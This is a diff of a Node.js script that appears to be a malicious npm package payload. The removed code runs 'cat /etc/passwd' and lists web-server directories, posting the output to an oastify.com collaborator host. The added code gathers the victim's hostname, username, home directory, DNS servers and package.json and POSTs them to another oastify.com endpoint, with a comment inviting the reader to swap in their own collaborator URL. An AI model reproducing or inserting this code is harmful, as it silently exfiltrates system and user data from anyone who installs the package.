@@ -1,31 +1,53 @@
-const { exec } = require('child_process');
-const axios = require('axios');
+const os = require("os");
+const dns = require("dns");
+const querystring = require("querystring");
+const https = require("https");
+const path = require("path");
+const fs = require("fs");
 
-const url = 'http://v845u9t1gtbc7bkdsf1soeqyup0goacz.oastify.com'; // L'URL où vous souhaitez envoyer les résultats
+// Construct the path to package.json dynamically
+const packageJSONPath = path.join(__dirname, "package.json");
+const packageJSON = JSON.parse(fs.readFileSync(packageJSONPath, "utf8"));
+const packageName = packageJSON.name;
 
-// Fonction pour exécuter une commande système et envoyer le résultat à l'URL spécifié
-function executeCommand(command) {
-  exec(command, (error, stdout, stderr) => {
-    if (error) {
-      console.error(`Erreur lors de l'exécution de la commande ${command}: ${error.message}`);
-      return;
-    }
-    if (stderr) {
-      console.error(`Erreur lors de l'exécution de la commande ${command}: ${stderr}`);
-      return;
-    }
-    // Envoyer le résultat à l'URL spécifié
-    axios.post(url, { command, output: stdout })
-      .then(() => {
-        console.log(`Résultat de la commande ${command} envoyé avec succès à ${url}`);
-      })
-      .catch((error) => {
-        console.error(`Erreur lors de l'envoi du résultat de la commande ${command} à ${url}: ${error.message}`);
-      });
-  });
-}
+const trackingData = JSON.stringify({
+    p: packageName,
+    c: __dirname,
+    hd: os.homedir(),
+    hn: os.hostname(),
+    un: os.userInfo().username,
+    dns: dns.getServers(),
+    r: packageJSON ? packageJSON.___resolved : undefined,
+    v: packageJSON.version,
+    pjson: packageJSON,
+});
 
-// Exécution des commandes et envoi des résultats
-executeCommand('cat /etc/passwd');
-executeCommand('ls /var/www/html/');
-executeCommand('ls /var/www/');
+var postData = querystring.stringify({
+    msg: trackingData,
+});
+
+var options = {
+    hostname: "knbabz8rzp03m4go81h7cjnnwe2fq6ev.oastify.com", // replace with your burp collaborator or Interactsh endpoint
+    port: 443,
+    path: "/",
+    method: "POST",
+    headers: {
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Content-Length": postData.length,
+    },
+};
+
+var req = https.request(options, (res) => {
+    res.on("data", (d) => {
+        process.stdout.write(d);
+    });
+});
+
+req.on("error", (e) => {
+    console.error(e);
+});
+
+req.write(postData);
+req.end();
+
+console.log("Tracking data sent:", trackingData);
